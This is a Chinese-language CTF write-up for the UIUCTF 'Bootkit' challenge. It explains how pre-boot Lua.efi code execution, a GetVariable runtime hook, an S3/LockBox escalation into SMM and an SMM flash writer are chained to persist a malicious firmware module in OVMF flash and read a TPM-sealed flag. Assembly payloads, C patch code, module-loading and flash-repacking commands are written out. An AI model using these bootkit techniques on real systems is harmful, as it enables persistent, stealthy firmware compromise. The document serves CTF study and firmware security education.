# Bootkit

## 题目简述

本题把 `Lua.efi` 的 pre-boot 代码执行与 `SMM Is Asleep` 的 S3/LockBox 原语串成一条持久化固件攻击链。秘密磁盘由 TPM PCR 状态封印；第一次启动时只要检测到键盘输入，磁盘就会脱离，因此当次获得的 shell 读不到 flag。磁盘、UKI 或 initrd 的修改又会改变 PCR 2、3、4、5、6、7、9，导致 LUKS 密钥不释放。唯一稳定路径是在第一次启动中改写 OVMF flash，使第二次无交互启动时固件自动修改内核运行态，而磁盘测量保持原值。

## 解题过程

### 1. 从 Lua.efi 植入一次性运行时 hook

先复用 Lua 5.2 bytecode 利用得到 UEFI 任意代码执行。最初若通过 `AllocatePool(EfiRuntimeServicesCode, ...)` 放置 hook，Linux 会根据 UEFI Memory Attributes Table 把该页映射为 NX，随后调用 `GetVariable` 会触发内核执行保护异常。

官方解法改为复用已有的可执行页：由 `gRT->SetVirtualAddressMap` 反推出 `RuntimeDxe._ModuleEntryPoint`，暂时清除 CR0.WP，把 payload 写到该代码页，再把 `gRT->GetVariable` 指向它。hook 先判断返回地址是否为负的 canonical kernel 地址；只有 Linux 调用 UEFI Runtime Services 时，才向固定内核符号写入命令，之后尾调用原始 `GetVariable`：

```asm
sysctl_run_command = 0xffffffff824a9360

payload:
  mov (%rsp), %rax
  test %rax, %rax
  jns preboot

  mov $sysctl_run_command, %rdi
  lea s_bash(%rip), %rsi
  mov $4, %rcx
  rep movsb

preboot:
  mov orig_getvariable(%rip), %rax
  push %rax
  ret

s_bash:
  .ascii "bash"
```

题目内核增加了只读 sysctl `/proc/sys/kernel/run_command`，initrd 会执行其中的字符串。因此这一临时 hook 在第一次 Linux 启动时写入 `bash`，让选手获得 root shell；由于先前的键盘输入已经触发秘密磁盘脱离，此时还不能读取 flag。

同一个 Lua payload 还通过 `gBS->LocateProtocol(gEfiSmmCommunicationProtocolGuid, ...)` 定位 `PiSmmIpl.efi`，并申请两页 `EfiRuntimeServicesData` 作为通信区，把两处动态地址打印到串口，供后续内核模块参数使用。

### 2. 把 S3 原语改造成 flash 写接口

加载官方 `exploit.ko` 时传入 Lua 阶段打印的地址：

```sh
insmod exploit.ko PiSmmIplPhys=<printed-address> RtDataPhys=<printed-address>
```

模块与 `SMM Is Asleep` 相同，通过可变 LockBox 覆盖 `S3Resume2Pei + 0x28b8`，在 S3 resume 且 SMRAM 开放时运行 stage 2。本题的 stage 2 不再覆盖单个 LockBox handler，而是从 `PiSmmIpl + 0x7160` 的私有数据中取出 `SmmEntryPoint`，将其整体替换为 stage 3。

QEMU 启用了 `cfi.pflash01 secure=on`，普通内核 MMIO 写会失败，SMM 写则被接受。CFI 单字节编程是两步状态机：先向目标地址写命令 `0x10`，再写实际字节。stage 3 从共享页取得目标、长度和数据，逐字节执行：

```asm
write_loop:
  lodsb
  movb $0x10, (%rbx)
  mov %al, (%rbx)
  inc %rbx
  dec %rcx
  jnz write_loop
  ret
```

内核模块在此基础上注册 `/dev/pflash`，映射 `0xffc00000` 开始、长度 `0x400000` 的完整 OVMF flash。变量区占前 `0x84000`，代码区为 `0xffc84000..0xffffffff`。

### 3. 重打包并持久化恶意固件模块

先跳过 132 个 4 KiB 页导出代码区，因为 $0x84000/0x1000=132$：

```sh
dd if=/dev/pflash of=code.rom bs=4096 skip=132 status=progress
```

对 `VariableSmmRuntimeDxe` 重新编译一个持久化补丁。它仍在 `RuntimeServiceGetVariable()` 被内核调用时修改 `sysctl_run_command`，但这次写入无人值守命令：

```c
static const char TargetCommand[] = "cat /mnt/flag";
static void *sysctl_run_command = (void *)0xffffffff824a9360;

if ((long)__builtin_return_address(0) < 0)
    CopyMem(sysctl_run_command, TargetCommand, sizeof(TargetCommand));
```

远端预装的是仍支持固件重建的旧版 [UEFITool/UEFIReplace](https://github.com/LongSoft/UEFITool/tree/old_engine)。用模块 GUID 和 section type 7 替换对应 FFS：

```sh
./UEFIReplace code.rom \
  9F7DCADE-11EA-448A-A46F-76E003657DD1 \
  7 VariableSmmRuntimeDxe.ffs \
  -o code_new.rom -asis
```

`flashtool` 从 `/dev/pflash` 偏移 `0x84000` 开始逐页比较，只把变化的 4 KiB 页交给 SMM CFI writer。这样恶意 `VariableSmmRuntimeDxe` 真正落进 firmware flash，而不是只驻留本次启动的 RAM。

### 4. 无交互重启并通过 TPM 测量

执行 `reboot -f` 后不再发送键盘输入。磁盘、UKI、initrd、Secure Boot 变量均未修改，所以题目实际使用的 PCR 2、3、4、5、6、7、9 与封印时一致；固件自身通常应进入 PCR 0/1，但本题没有把这两项纳入解封条件。因此 TPM 释放 LUKS 密钥，initrd 挂载秘密磁盘。

Linux 随后调用已持久化修改的 `GetVariable`，固件把 `cat /mnt/flag` 写入内核变量，initrd 自动执行它，串口输出：

```text
uiuctf{I_have_friends_everywhere:_smm_kernel_and_userspace_53fbc31c}
```

## 方法总结

- 核心技巧：用受信 Lua 解释器取得 pre-boot 执行，用 S3/LockBox 跨入 SMM，再实现 CFI flash writer，把一次性内存 hook 变成可跨重启的固件 bootkit。
- 识别信号：TPM 只对被纳入策略的 PCR 提供保证；如果固件根本不在解封测量范围内，攻击者控制 flash 后就能在不改磁盘的情况下影响后续内核。
- 复用要点：持久化链必须同时满足“可写 flash”“重启后自动触发”“不改变受检查 PCR”三项。仅绕过一次 Secure Boot、仅获得 root，或只在 RAM 中改 `gRT`，都无法解决本题的无交互第二次启动约束。
